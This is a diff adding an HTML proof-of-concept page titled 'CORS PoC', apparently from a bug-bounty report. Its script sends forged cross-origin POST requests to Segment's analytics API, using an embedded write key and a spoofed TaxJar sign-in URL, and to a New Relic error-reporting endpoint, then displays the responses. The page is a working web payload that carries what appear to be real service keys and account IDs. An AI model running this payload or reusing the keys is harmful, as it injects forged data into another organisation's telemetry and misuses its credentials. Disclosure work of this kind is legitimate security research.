@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS PoC</h2>
+    <script>
+      fetch("https://api.segment.io/v1/p", {
+        method: "POST",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: JSON.stringify({
+          type: "page",
+          context: {
+            page: { url: "https://app.taxjar.com/sign_in" }
+          },
+          anonymousId: "exploit-123",
+          writeKey: "jPW0Udoiicg5iccClHsBoWgjNoBdwd8N"
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        console.log("Segment Response:", data);
+        document.body.innerHTML += `<pre>${data}</pre>`;
+      });
+
+      fetch("https://bam.nr-data.net/jserrors/1/9603b1ae43?a=1788690&v=1.292.0", {
+        method: "POST",
+        headers: {
+          "Content-Type": "text/plain;charset=UTF-8"
+        },
+        body: JSON.stringify({
+          sm: [
+            { params: { name: "Generic/Test/PoC" }, stats: { c: 1 } }
+          ]
+        })
+      })
+      .then(res => res.blob())
+      .then(img => {
+        console.log("New Relic Response (gif):", img);
+        document.body.innerHTML += `<p>Success New Relic</p>`;
+      });
+    </script>
+  </body>
+</html>
+
